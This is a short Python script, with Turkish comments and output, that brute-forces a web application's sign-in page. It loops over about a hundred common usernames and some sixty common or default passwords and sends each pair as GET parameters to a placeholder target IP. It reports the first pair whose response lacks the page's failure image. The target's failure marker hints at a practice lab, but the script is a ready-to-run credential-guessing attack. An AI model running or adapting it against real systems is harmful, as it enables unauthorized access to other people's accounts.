import requests
import sys
import os

USERLIST = [
    'admin','administrator','root','user','test','guest','info','adm','mysql','apache',
    'ftp','backup','sysadmin','webadmin','support','manager','operator','superuser',
    'owner','service','master','demo','staff','public','default','temp','local','office',
    'dev','developer','git','gitlab','bitbucket','svn','jira','confluence','jenkins',
    'ansible','docker','kubernetes','node','python','php','ruby','java','tomcat','nginx',
    'apache2','webmaster','postmaster','mail','email','noreply','bot','robot','scanner',
    'monitor','report','security','firewall','proxy','vpn','radius','helpdesk','sales',
    'marketing','finance','billing','accounting','hr','humanresources','director',
    'ceo','cto','cfo','manager1','admin1','root1','supervisor','superadmin','super',
    'control','panel','cpanel','plesk','pleskadmin','oracle','sql','dbadmin','dba',
    'netadmin','network','engineer','operator1','service1','system','systemadmin',
    'sys','sysop'
]

DEFAULT_PASSWORDS = [
    '123456','password','12345678','qwerty','abc123','123456789','111111','1234567',
    'adobe123','123123','admin','1234567890','letmein','photoshop','1234','monkey',
    'shadow','sunshine','password1','princess','azerty','000000','welcome','login',
    'master','hello','freedom','whatever','654321','jordan23','harley','hunter2',
    'password123','zxcvbnm','asdfgh','veronica','buster','123qwe','michelle','scooter',
    'superman','qwerty123','football','1q2w3e4r','1qaz2wsx','zaq1xsw2','xsw2zaq1',
    'welcome1','welcome123','abc123!','admin123','root123','pass123','p@ssw0rd',
    'P@ssw0rd','Qwerty123','admin1','root1','demo123','guest123','user123'
]

TARGET_IP = "x.x.x.x"
TARGET_BASE_URL = f"http://{TARGET_IP}/index.php"

FAIL_INDICATOR = "images/WrongAnswer.gif"


def try_login(username, password):

    params = {
        "page": "signin",
        "username": username,
        "password": password,
        "Login": "Login"
    }
    
    try:
        response = requests.get(TARGET_BASE_URL, params=params, timeout=10, allow_redirects=True)
        text = response.text

        if FAIL_INDICATOR in text:
            return False
        
        # Eğer hala signin formu görünüyorsa başarısızdır
        if "username" in text.lower() and "password" in text.lower():
            return False

        return True
    
    except requests.exceptions.RequestException as e:
        print(f"⚠️  İstek hatası: {e}")
        return False


if __name__ == "__main__":
    print(f"[*] Target: {TARGET_IP}")
    print(f"[*] Kullanıcı listesi: {len(USERLIST)} kullanıcı")
    print(f"[*] Şifre listesi: {len(DEFAULT_PASSWORDS)} şifre\n")

    for username in USERLIST:
        print(f"\n=== Kullanıcı deneniyor: {username} ===")

        for password in DEFAULT_PASSWORDS:
            print(f"[-] Trying {username}:{password}")

            if try_login(username, password):
                print("\n🎉 GİRİŞ BAŞARILI!")
                print(f"Username: {username}")
                print(f"Password: {password}\n")
                sys.exit(0)

    print("\n❌ Hiçbir kullanıcı-parola kombinasyonu çalışmadı.")
